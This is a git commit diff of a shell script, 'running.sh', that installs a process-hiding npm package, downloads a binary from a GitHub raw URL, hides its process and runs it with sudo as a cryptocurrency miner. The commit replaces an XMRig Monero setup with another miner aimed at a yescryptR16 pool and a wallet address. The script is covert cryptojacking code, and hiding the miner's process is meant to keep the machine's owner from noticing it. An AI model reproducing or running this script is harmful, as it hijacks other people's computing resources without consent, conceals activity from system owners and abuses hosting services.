1406a1928361d9f3c54334cd2195588c38b822bf
realxdagg <121330162+realxdagg@users.noreply.github.com>
2022-12-27 10:58:17 +0700

    Update running.sh

--- running.sh
+++ running.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 npm i -g node-process-hider
-wget https://raw.githubusercontent.com/realxdagg/job/main/xmrig
-chmod 500 xmrig
-ph add xmrig
-sudo ./xmrig --url pool.hashvault.pro:80 --user SuboNeGJJrXVUSPz8cAD1JbrG78qDonJfKcqQNfmjK7TPVbhoDyJTNh1mRg6VTkGC1Gu6jU7XpLjmCAGWfbSRY2U5KNK3r9AY1 --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+wget https://raw.githubusercontent.com/realxdagg/job/main/SRB
+chmod 500 SRB
+ph add SRB
+sudo ./SRB --disable-gpu --algorithm yescryptR16 --pool eu.mecrypto.club:5440 --wallet Tpps38UBDYdKNd6rMUMwZgoLfsCvQCHSgZ --worker running --cpu-threads 8
